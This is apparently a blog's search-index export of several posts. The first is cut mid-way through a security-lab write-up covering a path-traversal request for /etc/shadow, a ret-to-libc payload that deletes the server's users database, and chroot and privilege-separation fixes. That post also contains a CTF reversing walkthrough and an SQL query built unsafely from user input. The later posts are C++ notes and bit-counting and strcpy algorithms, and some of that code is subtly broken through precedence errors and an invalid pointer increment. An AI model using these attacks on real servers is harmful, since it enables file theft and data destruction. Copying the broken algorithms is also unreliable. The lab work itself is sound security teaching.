failed![%s]\n",sqlite3_errmsg(db)); &#125;&#125;void updateLoginState( const char * u_name, const char * u_passwd, const char * ip_addr, const char * datetime) &#123; if(open_db()==SUCCESS)&#123; char sql[1024]; sprintf(sql, "UPDATE user SET ip_addr = '%s', time = '%s' WHERE name = '%s' AND passwd = '%s' ", ip_addr, datetime, u_name, u_passwd ); handle_db(db,sql); sqlite3_close(db); &#125; else&#123; if(DEBUG) printf("open failed![%s]\n",sqlite3_errmsg(db)); &#125;&#125;``` And in `handle.c:Handle_post()` function, after checking the login state, we should call `getLastState` function and send it to the browser, then call `updateLoginState` in the end... The final result just likes this : ![](/images/Privilege-Separation/3.png)![](/images/Privilege-Separation/4.png)### **Part B: Jail and Jail Breaking**#### **Exercise 3.**Modify the code snippet in the browser.c to send a constructed HTTP request to the web server to visit /etc/passwd file. That is, you can read that file remotely.As a test, we should check the permission of the **/etc/shadow** file at first, and try to access to it. As follows : ![](/images/Privilege-Separation/5.png) When we constructed HTTP request : GET …/…/…/…/…/…/…/…/…/…/…/etc/shadow HTTP/1.1\r\n\r\n 12345678and sent it, some funny things happened... ![](/images/Privilege-Separation/6.png)As we known, this file is private and important for the whole system, but we get it easily in this way... To defeat this kind of attack, one can use the the basic idea of chroot to isolate code that has potential security vulnerabilities.#### **Exercise 4.**Add some code to the server.c to add chroot support. Change root directory from / to /jail . After this, you can compile and run the new web server:```shchroot(&quot;/jail&quot;) Now re-do exercise 3 to visit the file /etc/passwd. If your chroot protection works, your browser will behave like this (leaking no sensitive information): As follows: The principle of this method is to exclude some important datas, and run in a restricted environment. For example, in chroot-setup.h file, we don’t copy some important files(passwd,shadow) to the /jail/etc/. Part C: Privilege Separation Exercise 5. Modify your browser code to inject some shell code the server. Your shell code attack the httpd daemon and unlink the file /db/users.db. Using ret-to-libc attack can make this a little simpler. Just likes the [Lab2], we can complete it in the same way. And then I will illustrate it detailed in a picture and attach my codes later… 123456789101112131415161718192021222324252627282930313233343536#if 1 req[1064] = 0x80; // system's address req[1065] = 0xfe; req[1066] = 0xe5; req[1067] = 0xf7;#endif req[1068] = 0x60; // exit's address req[1069] = 0x3b; req[1070] = 0xe5; req[1071] = 0xf7; req[1072] = 0x88; // arg's address req[1073] = 0xd2; req[1074] = 0xff; req[1075] = 0xff;#if 1 req[1076] = 0x72; // 'rm d' req[1077] = 0x6d; req[1078] = 0x09; req[1079] = 0x64; req[1080] = 0x62; // 'b/us' req[1081] = 0x2f; req[1082] = 0x75; req[1083] = 0x73; req[1084] = 0x65; // 'ers.' req[1085] = 0x72; req[1086] = 0x73; req[1087] = 0x2e; req[1088] = 0x64; // 'db' req[1089] = 0x62; req[1090] = 0x0; req[1091] = ' '; // make the function call end ...#endif Exercise 6. Modify the function in the file server.c , to set up the user and group IDs properly when services are launched. Think carefully about how your code can set the user and group IDs by setresuid()、setgroups()、setresgid(). Set file and directory permissions to ensure that the static service cannot read the database files from the dynamic service, and vice versa. Try to modify the chroot-setup.sh to set the permission for different files. In order to bind port 80 for the touchstone program, we have to start this server as a root. However, in the server.c file, we use fork and execve to run the filesv httpd banksv programs, as a result, these new programs will own root privilege…It is too dangerous… To solve this program, we need separate their permissions carefully. Firstly, when to execve these new processes, we need to use setresuid to change their permissions respectively. Just as follows: Before executing filesv: 12setresuid(115,115,115); uid = 115 ==&gt; other user named mysql and make &apos;filesv&apos; to be owned other&apos;s user Before executing banksv httpd: 12setresuid(1000, 1000, 1000);uid = 1000 ==&gt; liuchang Secondly, we modify the chroot-setup.sh and change the db directory to be owned by liuchang. After that, some important files need to be reassigned permissions. I will attach my codes later. 12345chown -R liuchang:liuchang /jail/dbchmod -R 750 dbchown mysql:mysql /jail/filesvchown liuchang:liuchang /jail/httpdchown liuchang:liuchang /jail/banksv When we construct a HTTP request likes ‘GET db/users.db’ or ‘GET /etc/shadow’, “FILE not existed” and ‘permissions deny’ errors will be returned. Just like this : Exercise 7. Is it is possible to perform a buffer overflow attack as lab1? Why? Of course, it does. The httpd filesv banksv processes will call getToken function to parse HTTP requests, however, getToken is vulnerable and can be exploited easily. Privilege separation can deny some illegal requests rather than preventing these programs from Buffer Overflow Attack. So it is possible to perform a buffer overflow attack unless we fixed up this hole… Challenge! Capture The Flag!!! Now we provide you a simple CTF game, download the file, and use what you can do to reverse it, finally you should find the flag. Also, we strip the [file] as what Mr.H did in the last class. So you may need use gdb to debug it. May following three commands is useful: 123(gdb)layout asm (gdb)si (gdb)finish And you should know that, who will invoke the main function. CAUTION: the flag is generated randomly, so any cheat will be found easily: I capture the flag by using IDA Pro tool… It is a little awkward… As we know, IDA is a professional weapon to disassember programs. We can see more details based on it. In this game, we use it to analysis this program and find something in the .data section, as a picture shown : Then we begin to look for which function will refer this data. The function named loc_8048500 will use this data. After that, we should follow flow of this program’s execution, and try to find how can invoke this function. Fortunately, I make it. As shown in a picture, we can find it absolutely though by objdum -d reverse | grep 8048500 That means when $ebp-12 is not equal to $0, the function will be called. OK ! Let’s try it in GDB. Firstly, we can break point in __libc_main_start and srand( We can get that funtion more quickly. I found it for a long time…555555…). Then type ‘r’ and ‘layout asm’ to watch the assember instructions. And type ‘si’ to follow this program until arriving here as follows : High tide !!! We are going to change the $ebp-12. Like this : Finally, we can get the flag as follows : An important note in the end: We can not set the value directly ( eg. set $ebp-12 = 0x11111111 ). We can type ‘finish’ when we want to end the funtion call quickly. It will reduce our time.]]></content>
      <tags>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++基础语法]]></title>
    <url>%2F2015%2F11%2F18%2FC%2B%2B%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[本学期的工程实践基础课选修了C++，因为要考试，顺便把以前学的C盲点记录一下。这些都是C的基础知识，涉及一些语法，以及程序设计中易犯的错误。不是概括的包含所有知识点，这只是针对我个人的盲点… 2 从C到C++ 2.1 命名空间 使用命名空间（namespace）时，结尾处不能添加分号。 2.2 操作符 使用不带参数的操作符，如**(hex, endl)，必须包含头文件iostream**；而使用带参数的操作符，如**(setfill，setw)，则需要头文件iomanip**。 setw操作符，一次设置，一次有效；而其他操作符，一旦设置，一直有效，持续到下次被设置为止。 加fixed之后再加setprecision(n)，使得小数部分精确到n位。 2.3 强制类型转换 static_cast: 最常用的强制类型转换，将一种数据类型转换到另一种数据类型，并使用任何合理的方式。 const_cast: 强制去掉常量属性。 reinterpret_cast: 可用来改变指针类型，需谨慎使用。 dynamic_cast: 使用与继承层次中的类型转换（用于多态）。 2.4 string 函数getline()常用来读入一行到string类型的变量中，但它不会把换行符存入到这个变量中。 s1.find_first_of(s2): 返回s1和s2都具有的第一个字符的索引。 s1.find_first_not_of(s2): 返回在s1但不在s2中的首位字符的索引。 2.5 内联函数 避免函数调用的开销，但如果函数体很大，那么程序的可执行代码将变得很大。宜将频繁使用的小函数声明为内联函数。 关键字inline出现在函数声明，而不是函数定义中。 2.6 函数签名与默认参数 返回值不是函数签名的一部分，所以不能通过返回值类型的不同，来实现函数的重载。默认参数出现的次序，应该从右往左，且不能间断。默认参数应出现在函数的声明而非函数的定义中给出。 3 类 3.1 默认构造函数 摘自CSDN一位大牛的解释 ： 1The default constructor is used whenever we define an object but do not supply an initializer. A constructor that supplies default arguments for all its parameters also defines the default constructor. 默认构造函数（缺省构造函数）跟系统提供不提供构造函数没有任何关系，默认构造函数就是当你定义一个对象时不需要提供初始化的的构造函数。包括三种情况： 1、根本没有显式的定义构造函数，当然由系统提供的默认构造函数，这个构造函数没有参数，啥也不做 2、定义了构造函数，但是不带任何参数，这也叫默认构造函数，特别的，如果这个函数体什么都不执行，就跟情况1一样。 3、定义了构造函数，也带有参数，但是所有参数都有默认参数，这个也叫默认构造函数 当然在一个类中，以上3中情况不可能共存，只要有一点满足就是默认构造函数。 3.2 拷贝构造函数 拷贝构造函数可以有多于一个的参数，但第一个以后的参数都必须有默认值。 拷贝构造函数的第一个参数，必须是一个类对象的引用。如果一个类包含指向动态存储空间的指针类型的数据成员，则应该为这个类设计拷贝构造函数。 如果拷贝构造函数是私有的，顶层函数和其他类的成员函数就不能通过传值来传递和返回该类的对象，因为这两个操作都需要调用拷贝构造函数。 3.3 构造函数 常量成员只能在初始化列表中初始化,这是初始化const类型成员的唯一方法。 3.4 析构函数 析构函数不带参数，不能被重载。 3.5 类数据成员与成员函数 在类内部声明的static数据成员必须在任何程序块之外定义。 如果将成员函数内的某个局部变量定义为静态变量，该类的所有对象在调用这个成员函数时将共享这个变量。 static类成员函数只能访问static类型的成员。 4 继承 4.1 改变访问限制 某些基类的成员可能不适合子类，这时候需要在子类中把基类的成员给隐藏掉。可以使用using声明。如下所示： 123456789class BC &#123;public: void setX()&#123;&#125;&#125;;class DC: public BC &#123;private: using BC::setX;&#125;; 4.2 保护成员 保护成员和私有成员类似，只在该类中可见。但在共有继承下，保护成员在子类中是可见的，而私有成员不可见。 在派生类的对象中都是不可见的。 一般来说，避免将数据成员设计成保护成员，即使某个数据成员可以成为保护成员。但更好地解决办法是：首先将这个数据成员定义为私有成员，然后为它设计一个用来进行存取访问的保护成员函数，通常将这种类型的成员函数成为访问函数。 4.3 子类的构造函数 如果基类拥有构造函数但没有默认构造函数，那么子类的构造函数应该显式的调用基类的构造函数。 构造的顺序: 先父母、再客人、最后自己。举个例子: 12345678910111213class A &#123;&#125;; class B &#123;&#125;;class C: public A &#123; public: C() &#123; &#125; private: B b1; B b2;&#125;; C类的构造函数，先构造父母A，在构造客人b1,b2，最后构造自己。子类的构造函数，只负责前一层对象的构造，祖先类对象的构造并不执行。 4.4 多继承的构造函数 先继承的先被构造，跟初始化列表中的顺序无关。客人不止一个，先声明谁就先构造谁。 4.5 保护继承 基类中的所有公有成员在派生类中是保护成员。 基类中的所有保护成员在派生类中是保护成员。 基类中的所有私有成员在派生类中是不可见的。 5 多态 5.1 动态绑定 使用动态绑定的程序会影响效率，因为虚成员函数表需要额外的存储空间 5.2 构造函数与析构 构造函数不能是虚成员函数，析构函数可以是虚成员函数。 5.3 虚成员函数 只要非静态成员才可以是虚成员函数。 5.4 重载、覆盖、隐藏 重载：具有不同的函数签名才可以重载，前提函数名要相同。 覆盖：基类有一个与子类相同函数名的虚成员函数，函数签名要相同，才形成覆盖。 隐藏：子类有一个与基类函数名相同的非虚成员函数，不论函数签名是否相同，子类都会隐藏基类的同名函数。 5.5 多态条件 继承层次中的同名函数，必须具有相同的函数签名，也就是所说的覆盖。 5.6 抽象基类 一个类只要有一个纯虚函数，就是抽象基类。抽象基类可以有其他不是纯虚成员函数或数据成员。 5.7 多态中的dynamic_cast dynamic_cast操作是否正确与转型的目标类型是否多态无关，但转型的源类型必须是多态的。也就是说dynamic_cast只能施加于具有多态性的类型，而且转型的目的类型必须是指针或者引用。 6 操作符重载 6.1 重载规则 成员选择符(.)、成员对象选择符(.*)、域解析操作符(::)和条件操作符(?:)不能被重载。除了赋值操作符(=)之外，基类中的所有被重载的操作符都将被子类继承。 重载不改变操作符的优先级和语法。 6.2 重载方式 成员函数重载: 1234567class A &#123;public: A( int x ) &#123; this-&gt;x = x; &#125; A operator+ ( const A &amp; a ) const &#123; return A( x + a.x ); &#125;private: int x;&#125;; 顶层函数重载： 1A operator+ ( const A &amp; a, const B &amp; b ) &#123; return A( a.x + b.x ); &#125; 6.3 顶层函数进行操作符重载 除了内存管理操作符new、new[]、delete、delete[]之外，一个以顶层函数形式重载的操作符必须在它的参数表中包含一个类对象。 使用顶层函数进行重载的一个优点就是非对象操作数可以出现在操作符的左边。而使用类成员函数时，第一个操作数必须是类的对象。 6.4 输入与输出操作符的重载 不能用顶层函数重载’=’ 只能将&gt;&gt;重载函数设计为顶层函数。 重载时的流对象应该是引用形式（屏幕、键盘不能复制的吧）。重载&gt;&gt;时，应将参数设为引用，因为要改变这个数的值的。 6.5 前置后置运算符的重载 operator++(int):后置 operator++:前置 6.6 重载转型操作符 声明中不能包含返回类型，即使void也不行。如下所示： 1operator othertype(); // othertype 可以为一个基本类型如int,或者一个类 6.7 内存管理操作符 重载new、new[]，顶层函数或者成员函数重载方式均返回void *类型。并且两种重载方式的第一个参数必须是size_t类型的参数。 重载delete、delete[]，两种重载方式均返回void，并且第一个参数必须是void *类型，用来指向需要释放的空间。]]></content>
      <tags>
        <tag>C++</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算数中二进制1的个数]]></title>
    <url>%2F2015%2F11%2F13%2F%E8%AE%A1%E7%AE%97%E6%95%B0%E4%B8%AD%E4%BA%8C%E8%BF%9B%E5%88%B61%E7%9A%84%E4%B8%AA%E6%95%B0%2F</url>
    <content type="text"><![CDATA[本文主要收集了一些很nice的方法，用来计算一个数，其二进制形式中1的位数。 简介 李明老师的C语言中级课程中，讲解了这一算法，无奈记性不好。。为了以后能时常看到，现记录下来。 简单相与法 比如一个二进制数 0b 1111 1111 = 0xFF，只需要： 1、与 0b 0000 0001 = 0x01 相与，如果为真，则个数加1； 2、与 0b 0000 0010 = 0x02 相与，如果为真，则个数加1； … n、如果这个数是16位的，必须相与到 0xFFFF 才能结束 核心代码如下: 12345for(i = 0; i &lt; 16; i++) &#123; if(num &amp; (1 &lt;&lt; i)) &#123; // 左移 i 位 =&gt; 1 * 2 ^ i count++; &#125;&#125; 与相邻数相与法 注意这种情况：一个数与这个数减1相与，会把这个数的最后面的一位1变为0.如下情况： 1230b 1000 &amp; 0b 0111 = 0b 00000b 1111 &amp; 0b 1110 = 0b 11100b 1010 &amp; 0b 1001 = 0b 1000 这就引出下面的一种算法，其核心代码如下： 1234while(num != 0) &#123; num = num &amp; num - 1; // 每次把最后一个1变为0 count++;&#125; 每三位计算一次 这一个算法实在CSAPP课上老师讲解的一个算法，现在给它添加上去。原理就是对每3个比特计算一下1的个数，可以同步进行，计算一个32位的数字，最多执行11次。具体做法: 假设这3为比特位为 abc，那么这3位比特位含1的个数为 a + b + c。而 abc 换成十进制为 4a + 2b + c，注意怎么从 4a + 2b + c 变到 a + b + c，因为后者才是这3位数含有的1的个数。这个是通过下面一个式子实现的。假设一个3比特位的数 abc. 123(abc &gt;&gt; 1) &amp; 011 = 0ab = 2a + b (十进制)(abc &gt;&gt; 2) &amp; 001 = 00a = a (十进制)abc - ((abc &gt;&gt; 1) &amp; 011) - ((abc &gt;&gt; 2)) &amp; 001 ) = a + b + c 那么就有如下的代码，可以计算一个32位数中1的个数，如下所示: 12345int bitcount(unsigned int n) &#123; unsigned int tmp; tmp = n - ((n &gt;&gt; 1) &amp; 033333333333) - ((n &gt;&gt; 2) &amp; 011111111111); return ((tmp + (tmp &gt;&gt; 3)) &amp; 030707070707) % 63;&#125; 最后那个 return 语句是为了把这个数字每3位中的1的个数加起来， 与特定值相与法 上一个算法看似很好，但如果遇到 0xFF 和 0xFFFF 之类全1的数，性能就下降了。对此想到一种新的算法. 12345 0b 1111 1111 &amp; 0b 0101 0101 = 0b 0101 0101 0b 0101 0101&amp; 0b 0101 0101 = 0b 0101 0101 把上述俩个结果相加得: 10b 0101 0101 + 0b 0101 0101 = 0b 1010 1010 这只是计算出每两位所含的1，即10（为2）个。同理计算每4位的，再计算每8位的等等… 123#define M1 0x55 // 0b 0101 0101&lt;/strong&gt; #define M2 0x33 // 0b 0011 0011&lt;/strong&gt; #define M3 0x0F // 0b 0000 1111&lt;/strong&gt; 上述三个宏用来测试八位数中的二进制中1的个数，其测试代码如下： 123num = num &amp; M1 + ( ( num &gt;&gt; 1 ) &amp; M1 );num = num &amp; M2 + ( ( num &gt;&gt; 2 ) &amp; M2 );num = num &amp; M3 + ( ( num &gt;&gt; 4 ) &amp; M3 ); 最后的num地值，即为1的个数。假设为32位的数，那么需要5个宏定义，分别如下: 1234567891011#define M1 0x55555555 #define M2 0x33333333 #define M3 0x0F0F0F0F #define M4 0x00FF00FF #define M5 0x0000FFFFnum = num &amp; M1 + ( ( num &gt;&gt; 1 ) &amp; M1 );num = num &amp; M2 + ( ( num &gt;&gt; 2 ) &amp; M2 );num = num &amp; M3 + ( ( num &gt;&gt; 4 ) &amp; M3 );num = num &amp; M4 + ( ( num &gt;&gt; 8 ) &amp; M4 );num = num &amp; M5 + ( ( num &gt;&gt; 16 ) &amp; M5 ); 最后的num地值，即为1的个数。这种算法时间复杂度固定，为 O(1)。]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[字符串拷贝算法]]></title>
    <url>%2F2015%2F11%2F08%2F%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%B7%E8%B4%9D%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[简介 李明老师的C语言中级课程中，讲解了这一算法，无奈记性不好。。为了以后能时常看到，现记录下来。 函数原型为： 1strcpy( char *dest, char *src ) 简单方法 核心代码： 1while( *dest++ = *src++ ); 增量值算法 因为dest和src存储位置相邻，与其每次访问dest和src两个地址，不如只访问src所指存储空间，核心代码如下： 12int delta = dest - src;while(*(char *)(src + delta)++ = *src++); 每次复制4个字节算法 因为在32操作系统下，每次复制32位字符串，会大大地提高效率。核心代码如下： 123456789101112int * d = (int *)dest;int * s = (int *)src;while(1) &#123; if(!CONTAIN_OF_ZERO_BYTE(*s)) &#123; * d = * s; d++, s++; continue; &#125; src = s; dest = d; while( *dest++ = *src++ ); //最多执行4次&#125; 上述的那个宏很重要，可以判断一个字节中是否含有‘\0’，因为字符串复制遇到’\0’就可以结束了。 12#define TEST(n) (((n - 1) &amp; (~n)) &amp; 0x80) // 为0时返回真#define CONTAIN_OF_ZERO_BYTE(n) (((n - 0x01010101) &amp; (~n)) &amp; 0x80808080) //只要字节中含有0即返回真]]></content>
      <tags>
        <tag>算法</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
</search>
